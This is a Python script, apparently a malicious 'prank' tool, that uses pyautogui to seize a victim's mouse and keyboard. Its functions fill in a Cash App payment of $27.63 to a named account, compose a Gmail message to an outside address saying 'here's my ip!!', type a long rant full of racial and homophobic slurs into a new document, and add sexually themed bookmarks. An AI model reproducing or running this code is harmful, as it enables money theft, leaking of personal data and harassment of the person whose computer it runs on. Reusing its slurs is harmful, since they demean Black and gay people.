import webbrowser
import time
import ctypes
import pyautogui
import requests
from random import choice
from playsound import playsound
import platform
import io
import pyperclip



def play_mp3(url):
    response = requests.get(url)
    with open('song.mp3', 'wb') as file:
        file.write(response.content)

    while True:
        playsound('song.mp3')


def ss():
    # Capture the screenshot
    screenshot = pyautogui.screenshot()

    # Convert the image to bytes
    image_bytes = io.BytesIO()
    screenshot.save(image_bytes, format='PNG')
    image_bytes.seek(0)

    # Copy the image data to the clipboard
    pyperclip.copy(image_bytes)


def close():
    system = platform.system()

    if system == "Windows":
        pyautogui.hotkey('win', 'd')
    elif system == "Darwin":  # macOS
        pyautogui.hotkey('command', 'option', 'm')
    elif system == "Linux":
        pyautogui.hotkey('ctrl', 'alt', 'd')

def ruincareer():
    webbrowser.open("https://twitter.com/messages/compose")
    pyautogui.write('Hello world!', interval=0.25)

def scary():
    webbrowser.open("https://docs.new")
    pyautogui.write("Run that back, because that joke was horrible nigga, open your mouth. *fart sound* When you speak to me speak with yo chin up like it’s picture day. *camera flashes* Bitch ass boy and I fucked your mom long dick style. Stop playing with me faggot ass boy. Now I’m boutta cut the shit outta your faggot ass. Fuck is you talmbout you just got combo’d by Marski, Marski Salarsky, bitch ass boy. You mad as shit cuz I smacked yo mama in the back of the neck with a piece of ham and that bitch turned into a ham sandwich and started saying \"GOBBITYGOBBADAGOBBGOBBGOBB\" like she was a Thanksgiving chicken. Faggot bitch. She's not a fucking turkey she's a fucking chicken, faggot boy. Shut your bitch ass up. Your mom is allergic to chickens. Your mom has sex with this kid and Arnold Schwarzenneger behind the Toy Story Pizza Planet truck yelling, \"Ya, get to the pizza! Ya!\" and a fucking pepperoni slipped up her ass and she puked out a fucking booger. Bitch ass boy, shut yo bitch ass up.", interval=0.25)

def give():
    try:
        pyautogui.moveTo(100, 100)
        webbrowser.open('https://cash.app/account/pay-and-request')
        time.sleep(5)
        try:
            pyautogui.click('monet.png')
        except:
            pass
        pyautogui.write("27.63",interval=0.01)
        pyautogui.click('to.png')
        pyautogui.write("$ArcticFox975\n", interval=0.01)
        time.sleep(1)
        pyautogui.click('from.png')
        time.sleep(1)
        pyautogui.click('cb.png')
        time.sleep(1)
        pyautogui.click('for.png')
        pyautogui.write("sugar mama", interval=0.01)
        return True
    except:
        return False

def bookmark():
    pyautogui.hotkey('ctrl', 'd')
    pyautogui.hotkey('cmd', 'd')
    pyautogui.press('backspace')
    names = ['gay pron', 'gray men kissing', 'sus things', '']
    time.sleep(0.5)
    pyautogui.write(choice(names), interval=0.25)
    pyautogui.press('enter')


def change_cursor(cursor_path):
    # Load the cursor file
    cursor = ctypes.windll.user32.LoadCursorFromFileW(cursor_path)

    # Set the loaded cursor as the current cursor
    ctypes.windll.user32.SetCursor(cursor)




def email(text):
    '''
    webbrowser.open("https://whatismyipaddress.com/")
    time.sleep(3)
    ss()
    pyautogui.hotkey('ctrl', '0')
    pyautogui.hotkey('ctrl', '-')
    pyautogui.hotkey('ctrl', '-')
    pyautogui.hotkey('ctrl', '-')
    '''
    webbrowser.open("https://mail.google.com/mail/u/0/#inbox?compose=new")
    loaded = False
    while not loaded:
        try:
            pyautogui.click('sub.png')
            loaded = True
            pyautogui.write("here's my ip!!", interval=0.01)
        except:
            pass

    loaded = False
    while not loaded:
        try:
            pyautogui.click('rec.png')
            loaded = True
            pyautogui.write("themaskedfag@outlook.com\n", interval=0.01)
        except:
            pass
    pyautogui.move(0, 120)
    pyautogui.click()
    pyautogui.write(text, interval=0.01)

# Example usage
change_cursor("Normal.cur")